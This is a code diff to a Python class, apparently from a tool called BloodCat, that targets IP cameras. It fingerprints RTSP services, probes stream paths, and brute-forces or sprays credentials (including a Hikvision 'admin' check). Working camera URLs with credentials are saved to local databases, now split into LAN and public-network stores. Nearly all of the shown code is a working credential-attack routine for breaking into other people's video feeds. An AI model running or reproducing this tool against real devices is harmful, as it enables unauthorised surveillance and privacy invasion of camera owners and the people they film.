@@ -33,6 +33,7 @@ class CamLib():
         self.IV = b'14' + b'\x00' * 14   
         self.SEP = b'\uE000' 
         self.LOCAL_DB = './data/global.bc'
+        self.LOCAL_LAN_DB = './data/lan.lc'
         self.DB = 'https://raw.githubusercontent.com/MartinxMax/db/refs/heads/main/blood_cat/global.bc'
         self.TIMEOUT=3
         self.default_user = "bloodcat"
@@ -457,111 +458,148 @@ class CamLib():
                 log.info(f"Results successfully appended to: [\033[33m{path_file}\033[0m]")
 
     def hiv(self,ip:str,port=554,password=''):
-            def extract_ip(rtsp):
-                match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
-                return match.group(1) if match else None
-            data = self.get_LocalDB_data(self.LOCAL_DB)
-            if not data:
-                data = []
-            ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
-            if ip in ip_set:
-                log.warning(f"[{ip}] This IP has already been recorded...",ip)
-                return 0
-            path = self.PATH[0]
-            auth_bloodcat = self.b64('admin', password)
-            resp = self.describe_path(ip, port, path, auth_bloodcat)
-            code = self.status(resp)
-            if code in (200, 403):
-                ip_data = self.show_location(ip)
-                rtsp_url = f"rtsp://admin:{password}@{ip}:{port}{path}"
-                log.success(f"Hikvision RTSP PLAY ：[\033[5m{rtsp_url}]",rtsp_url)
-                self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
-            else:
-                log.warning(f"Hikvision camera unreachable (likely firewall-blocked, verify via web service): [admin:{password}@{ip}:{port}]")
-    
-    def run(self, ip: str, port=554,password=''):
         def extract_ip(rtsp):
             match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
             return match.group(1) if match else None
-        if password:
-            self.PASSWORD = [password]
-            log.info(f"Currently entering password spraying : Try Password => [{password}]",f"{password}")
-        ip_data = self.show_location(ip)
-        if not ip_data:
-            return 0
+        # Only public global.bc data
         data = self.get_LocalDB_data(self.LOCAL_DB)
         if not data:
             data = []
         ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
         if ip in ip_set:
-            log.warning("This IP has already been recorded...")
+            log.warning(f"[{ip}] This IP has already been recorded...",ip)
             return 0
-       
-        resp = self.options_no_auth(ip, port)
+        path = self.PATH[0]
+        auth_bloodcat = self.b64('admin', password)
+        resp = self.describe_path(ip, port, path, auth_bloodcat)
         code = self.status(resp)
-        if code is None:
-            log.warning("Partial fingerprint match (50%): no response from target")
-        elif code == 200:
-            log.info("Full fingerprint match (100%): resource accessible without authentication")
-        elif code == 401:
-            log.info("Full fingerprint match (100%): authentication required")
-        elif code == 403:
-            log.info("Full fingerprint match (100%): access explicitly forbidden")
-        elif code in (404, 454):
-            log.info("Full fingerprint match (100%): URI ignored")
-        log.info(f"Probing paths using credentials [{self.default_user}:{self.default_password}]...",f"{self.default_user}:{self.default_password}")
-        auth_bloodcat = self.b64(self.default_user, self.default_password)
-        paths_with_401 = []
-        paths_no_auth = []
-        for path in self.PATH:
-            resp = self.describe_path(ip, port, path, auth_bloodcat)
-            code = self.status(resp)
-            if code == 401:
-                log.info(f"Path [{path}] exists, proceeding with credential brute-force...",f"{path}")
-                paths_with_401.append(path)
-                break
-            elif code == 200:
-                log.info(f"Path [{path}] exists and is accessible without authentication!",f"{path}")
-                paths_no_auth.append(path)
-                break
-            elif code == 404 or code == 400:
-                log.info(f"Path [{path}] does not exist",f"{path}")
-            else:
-                log.warning(f"Target returned an unexpected response: [{code}] , please try again later...",f"{code}")
-            time.sleep(0.2)
-        if paths_no_auth:
-            rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
-            log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
+        if code in (200, 403):
+            ip_data = self.show_location(ip)
+            rtsp_url = f"rtsp://admin:{password}@{ip}:{port}{path}"
+            log.success(f"Hikvision RTSP PLAY ：[\033[5m{rtsp_url}]",rtsp_url)
             self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
-            return 1
-        if not paths_with_401:
-            paths_with_401 = self.PATH[0]
-        valid_creds = []
-        target_path = paths_with_401[0]
- 
-        log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")
-        for u in self.USER:
-            for p in self.PASSWORD:
-                auth = self.b64(u, p)
-                if target_path:
-                    resp = self.describe_path(ip, port, target_path, auth)
-                else:
-                    resp = self.describe_root(ip, port, auth)
-                code = self.status(resp)
-                if code in (200, 403):
-                    print()
-                    log.info(f"Found credentials : [{u}:{p}]",f"{u}:{p}")
-                    rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
-                    log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]",f"{rtsp_url}")
-                    self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
-                    return 1
-                else:
-                    sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
-                    sys.stdout.flush()
-                time.sleep(0.2)
         else:
-            print()
-            log.warning("No valid credentials found")
+            log.warning(f"Hikvision camera unreachable (likely firewall-blocked, verify via web service): [admin:{password}@{ip}:{port}]")
+ 
+
+
+    def run(self, ip: str, port=554, password=''):
+
+        def extract_ip(rtsp):
+            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
+            return match.group(1) if match else None
+
+ 
+        if password:
+            self.PASSWORD = [password]
+            log.info(f"Currently entering password spraying : Try Password => [{password}]", f"{password}")
+
+        ip_data = self.show_location(ip)
+
+        def _probe_and_auth(db_path, scope_log_msg):
+            log.info(scope_log_msg)
+            data = self.get_LocalDB_data(db_path)
+            if not data:
+                data = []
+
+            ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
+            if ip in ip_set:
+                log.warning("This IP has already been recorded...")
+                return 0
+
+ 
+            resp = self.options_no_auth(ip, port)
+            code = self.status(resp)
+            if code is None:
+                log.warning("Partial fingerprint match (50%): no response from target")
+            elif code == 200:
+                log.info("Full fingerprint match (100%): resource accessible without authentication")
+            elif code == 401:
+                log.info("Full fingerprint match (100%): authentication required")
+            elif code == 403:
+                log.info("Full fingerprint match (100%): access explicitly forbidden")
+            elif code in (404, 454):
+                log.info("Full fingerprint match (100%): URI ignored")
+
+            log.info(f"Probing paths using credentials [{self.default_user}:{self.default_password}]...", f"{self.default_user}:{self.default_password}")
+            auth_bloodcat = self.b64(self.default_user, self.default_password)
+
+            paths_with_401 = []
+            paths_no_auth = []
+
+            for path in self.PATH:
+                resp = self.describe_path(ip, port, path, auth_bloodcat)
+                code = self.status(resp)
+                if code == 401:
+                    log.info(f"Path [{path}] exists, proceeding with credential brute-force...", f"{path}")
+                    paths_with_401.append(path)
+                    break
+                elif code == 200:
+                    log.info(f"Path [{path}] exists and is accessible without authentication!", f"{path}")
+                    paths_no_auth.append(path)
+                    break
+                elif code == 404 or code == 400:
+                    log.info(f"Path [{path}] does not exist", f"{path}")
+                else:
+                    log.warning(f"Target returned an unexpected response: [{code}] , please try again later...", f"{code}")
+                time.sleep(0.2)
+
+            if paths_no_auth:
+                rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
+                log.success(f"RTSP PLAY  ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
+                self.save_info(rtsp_url, ip_data, db_path, True)
+                return 1
+
+ 
+            if not paths_with_401:
+                paths_with_401 = [self.PATH[0]]
+
+            valid_creds = []
+            target_path = paths_with_401[0]
+
+            log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")
+
+ 
+            for u in self.USER:
+                for p in self.PASSWORD:
+                    auth = self.b64(u, p)
+                    if target_path:
+                        resp = self.describe_path(ip, port, target_path, auth)
+                    else:
+                        resp = self.describe_root(ip, port, auth)
+                    code = self.status(resp)
+                    if code in (200, 403):
+                        print()
+                        log.info(f"Found credentials : [{u}:{p}]", f"{u}:{p}")
+                       
+                        rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if 'path' in locals() and path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
+                        log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
+                        self.save_info(rtsp_url, ip_data, db_path, True)
+                        return 1
+                    else:
+                        sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
+                        sys.stdout.flush()
+                    time.sleep(0.2)
+            else:
+                print()
+                log.warning("No valid credentials found")
+
+            return None
+ 
+        if 'lan' in ip_data:
+            res = _probe_and_auth(self.LOCAL_LAN_DB, "Detected that the current target is located within a local network...")
+            if res is not None:
+                return res
+        elif 'country' in ip_data:
+            res = _probe_and_auth(self.LOCAL_DB, "Detected that the current target is located on the public network...")
+            if res is not None:
+                return res
+        else:
+            log.error("Failed to retrieve IP information.")
+            return 0
+
+        return 2
+
     
     def show_location(self,ip:str):
         def check_ip_type(ip: str) -> int:
@@ -576,7 +614,7 @@ class CamLib():
         code = check_ip_type(ip)
         if code == 2:
             data = {
-                'LAN':ip
+                'lan':ip
             }
             return data
         elif code == 1:
@@ -666,6 +704,5 @@ Network Range: {data['network']}
                     "chmod +x ./exploitdb/searchsploit"
                 )
         return data
-
 
 
